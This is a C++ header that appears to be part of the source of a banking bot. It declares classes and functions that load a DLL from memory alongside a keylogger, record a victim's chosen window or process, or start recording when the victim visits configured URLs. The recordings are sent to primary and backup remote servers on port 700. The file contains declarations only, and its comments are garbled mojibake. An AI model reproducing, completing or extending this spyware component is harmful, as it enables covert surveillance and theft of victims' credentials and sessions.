#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"


// ��������� ��������� ��� �������
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// ���� ������� ����� �����
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



//****************************************************
//  TVideoRecDLL - ����� ��� ������ � �����������
//                 �����������
//****************************************************
class TVideoRecDLL : public TBotObject
{
private:

	static const int VIDEO_FULLSCREEN	= 0x0001; //������������� ������
	static const int VIDEO_ALWAYS		= 0x0002; //���������� ������, ���� ���� ���� �� �������

	// ���������� ���� ������1
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
	typedef VOID (WINAPI *TStartFindFields)();
	typedef VOID (WINAPI *TStopFindFields)();
	//
	//
	HMEMORYMODULE FHandle;

	void InitializeApi();
	void LoadFunc(LPVOID *Addr, const char* Name);
public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TStartRecHwnd     RecordWnd;
	TStartRecPid      RecordProcess;
	TStopRec          Stop;
	TResetTimer       ResetTimer;
	TStartSend        SendData;
	TStartFindFields  StartFindFields;
	TStopFindFields   StopFindFields;
};



//****************************************************
//
//****************************************************
class TVideoRecorder : public TBotObject
{
private:
	TVideoRecDLL FDLL;
public:
	string UID;        // ������������� ����
    string VideoName;  // ��� �����
	string Server;     // ����� ��������� ������� �������� �����
	string Server2;    // ����� ���������������� ������� �������� �����
	int    Port;       // ���� ��������� ������� �������� �����
	int    Port2;      // ���� ��������������� ������� �������� �����
	int    RecordTime; // ����� ������, � ��������

	TVideoRecorder();
	~TVideoRecorder();

	void ReccordProcess(DWORD PID);
	void ReccordCurrentProcess();
};




void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StopRecordThread();//������������� ����� ������ �����
void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//���������� ��� � �������� �� ��� �-���

//���� ���� ������ ���� ��������� ������� � �����, �������� ��� �������� ����������
void StartFindFields();
DWORD WINAPI StartSendinThread(LPVOID Data);

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();

//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  ������ ������� ������������� ������ �����
//  ���������� ������� - ������ ����� �������� �� �������
//  ������������������� ��������
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - ������� ��������� ������ �������������
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - ������� �������� ������ ������
	//					����� ��� �������� ��������
	//
	// URL - ����� ���� ��� �������� ���������������� ������.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	// StopRecording - ������� ������������� ������ ������
	//					����� ��� �������� ��������
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - ������� ��������� �������� ��
	//               ������ ������ � ��������� PID
	//	���� PID ����� 0 �� ����� ����������� �������
	//  �������
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif